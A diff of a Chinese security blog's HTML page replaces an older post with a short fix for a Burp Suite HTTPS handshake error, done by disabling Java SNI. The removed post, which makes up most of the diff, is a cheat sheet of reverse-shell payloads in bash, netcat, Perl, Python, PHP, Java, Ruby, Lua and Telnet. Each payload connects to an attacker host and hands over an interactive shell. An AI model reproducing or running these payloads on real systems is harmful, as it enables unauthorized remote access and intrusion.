@@ -4,27 +4,25 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>linux反弹shell姿势 | MSAREHERE</title>
+    <title>burp错误解决 | MSAREHERE</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="MS">
     
 
     
-    <meta name="description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
-<meta name="keywords" content="反弹shell">
+    <meta name="description" content="burp抓https包出现页面无返回情况">
+<meta name="keywords" content="Burp,HTTPS,错误">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux反弹shell姿势">
-<meta property="og:url" content="https://michaelwayneliu.github.io/2017/02/15/first/index.html">
+<meta property="og:title" content="burp错误解决">
+<meta property="og:url" content="https://michaelwayneliu.github.io/2018/01/13/burp错误解决/index.html">
 <meta property="og:site_name" content="MSAREHERE">
-<meta property="og:description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
+<meta property="og:description" content="burp抓https包出现页面无返回情况">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://p1.bpimg.com/567571/fd99badf0491cb40.png">
-<meta property="og:updated_time" content="2017-03-06T13:52:54.250Z">
+<meta property="og:updated_time" content="2018-01-13T01:47:50.331Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux反弹shell姿势">
-<meta name="twitter:description" content="遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。">
-<meta name="twitter:image" content="http://p1.bpimg.com/567571/fd99badf0491cb40.png">
+<meta name="twitter:title" content="burp错误解决">
+<meta name="twitter:description" content="burp抓https包出现页面无返回情况">
 
     
     <link rel="alternative" href="/atom.xml" title="MSAREHERE" type="application/atom+xml">
@@ -88,14 +86,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2017/02/15/first/" title="linux反弹shell姿势" itemprop="url">linux反弹shell姿势</a>
+      <a href="/2018/01/13/burp错误解决/" title="burp错误解决" itemprop="url">burp错误解决</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="MS" target="_blank" itemprop="author">MS</a>
 		
   <p class="article-time">
-    <time datetime="2017-02-15T06:59:07.000Z" itemprop="datePublished"> 发表于 2017-02-15</time>
+    <time datetime="2018-01-13T01:35:29.000Z" itemprop="datePublished"> 发表于 2018-01-13</time>
     <span id="busuanzi_container_page_pv">
     总阅读<span id="busuanzi_value_page_pv"></span>次
 </span>
@@ -110,73 +108,24 @@
 		
 		</div>
 		
-		<p><img src="http://p1.bpimg.com/567571/fd99badf0491cb40.png" alt="image"><br>遇到linux服务器，马上想到反弹shell到本地进行溢出等提权尝试,这里搜集了一些常用的反弹姿势。</p>
-<a id="more"></a>
-<ul>
-<li>首先，选一个未被目标防火墙过滤的TCP端口</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">attacker$ nc -l -v attackerip 4444</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>Bash</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&lt;&amp;196;<span class="built_in">exec</span> 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. <span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/attackerip/4444</span><br><span class="line">2. cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span>  <span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>Perl</strong>           </li>
-</ul>
-<p>不依赖于/bin/sh</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
-<p>如果是目标基于windows，还可以</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure>
-<p>也可上传一个</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.pl</span></span><br><span class="line"><span class="keyword">use</span> Socket;</span><br><span class="line">$i=<span class="string">"x.x.x.x"</span>;</span><br><span class="line">$p=<span class="number">8080</span>;</span><br><span class="line"><span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,<span class="keyword">getprotobyname</span>(<span class="string">"tcp"</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">connect</span>(S,sockaddr_in($p,inet_aton($i))))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">open</span>(STDIN,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDOUT,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">open</span>(STDERR,<span class="string">"&gt;&amp;S"</span>);</span><br><span class="line">        <span class="keyword">exec</span>(<span class="string">"/bin/sh -i"</span>);</span><br><span class="line">            &#125;;</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>Netcat</strong>  </li>
-</ul>
-<p>取决于nc的版本，在Linux的大部分发行版中都默认编译了nc，但也许是出于安全考虑，发行版中默认编译的nc往往没有-e选项(没有define一个GAPING_SECURITY_HOLE常量)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh attackerip 4444</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh | nc attackerip 4444</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果没有权限使用mkfifo /tmp/backpipe也可以创建一个管道</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. mknod /tmp/backpipe p</span><br><span class="line">2. /bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>python</strong></li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1.py</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"x.x.x.x"</span>,<span class="number">8080</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/sh"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#2.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'10.16.44.100'</span> <span class="comment"># The remote host</span></span><br><span class="line">PORT = <span class="number">443</span> <span class="comment"># The same port as used by the server</span></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment"># connect to attacker machine</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"><span class="comment"># send we are connected</span></span><br><span class="line">s.send(<span class="string">'[*] Connection Established!'</span>)</span><br><span class="line"><span class="comment"># start loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="comment"># recieve shell command</span></span><br><span class="line">data = s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment"># if its quit, then break out and close socket</span></span><br><span class="line"><span class="keyword">if</span> data == <span class="string">"quit"</span>: <span class="keyword">break</span></span><br><span class="line"><span class="comment"># do shell command</span></span><br><span class="line">proc = subprocess.Popen(data, shell=<span class="keyword">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)</span><br><span class="line"><span class="comment"># read output</span></span><br><span class="line">stdout_value = proc.stdout.read() + proc.stderr.read()</span><br><span class="line"><span class="comment"># send output to attacker</span></span><br><span class="line">s.send(stdout_value)</span><br><span class="line"><span class="comment"># close socket</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>Telnet</strong></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet attackerip 4444 0/tmp/p</span><br></pre></td></tr></table></figure>
-<p>本地在4445端口监听<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet attackerip 4444 | /bin/bash | telnet attackerip 4445</span><br></pre></td></tr></table></figure></p>
-<ul>
-<li><strong>PHP</strong></li>
-</ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>JAVA</strong></li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong>Ruby</strong>    </li>
-</ul>
-<p>目标基于linux<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
-<p>目标基于windows<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure></p>
-<ul>
-<li><strong>lua</strong></li>
-</ul>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
-<p>参考链接：<br><a href="https://www.waitalone.cn/linux-shell-rebound-under-way.html" target="_blank" rel="noopener">https://www.waitalone.cn/linux-shell-rebound-under-way.html</a></p>
+		<p>burp抓https包出现页面无返回情况<br><a id="more"></a><br>burp抓https包出现页面无返回情况，F12定位资源请求发现某个页面的返回头中X-Frame-Options值设为DENY，<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/X-Frame-Options" target="_blank" rel="noopener">参考</a><br>单独请求该资源，得到错误<strong>handshake alert: unrecognized_name</strong>，google之，是SSL在JAVA7中的实现问题，使用如下命令启动burp，解决</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -Djsse.enableSNIExtension=false -jar burpsuite_pro_v1.X.jar</span><br></pre></td></tr></table></figure>
+<p>这会禁止服务器名称暗示扩展–Server Name Indication (SNI) extension，让JAVA忽略Unrecognized Name这个错误。在user options–&gt;SSL也可以Disable Java SNI extension</p>
   
 	</div>
 
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
 
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/工具/">工具</a>
+</div>
+
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/反弹shell/">反弹shell</a>
+  <span></span> <a href="/tags/Burp/">Burp</a><a href="/tags/HTTPS/">HTTPS</a><a href="/tags/错误/">错误</a>
   </div>
 
 </div>
@@ -185,7 +134,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="https://michaelwayneliu.github.io/2017/02/15/first/" data-title="linux反弹shell姿势 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
+	  <div data-url="https://michaelwayneliu.github.io/2018/01/13/burp错误解决/" data-title="burp错误解决 | MSAREHERE" data-tsina="2639885925" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -199,13 +148,21 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2017/03/06/java/" title="Java反序列化漏洞">
+ <a href="/2018/01/13/opcache那些事/" title="opcache那些事">
   <strong>上一篇：</strong><br/>
   <span>
-  Java反序列化漏洞</span>
+  opcache那些事</span>
 </a>
 </div>
 
+
+<div class="next">
+<a href="/2018/01/12/service-worker-xss进化/"  title="service worker--xss进化">
+ <strong>下一篇：</strong><br/> 
+ <span>service worker--xss进化
+</span>
+</a>
+</div>
 
 </nav>
 
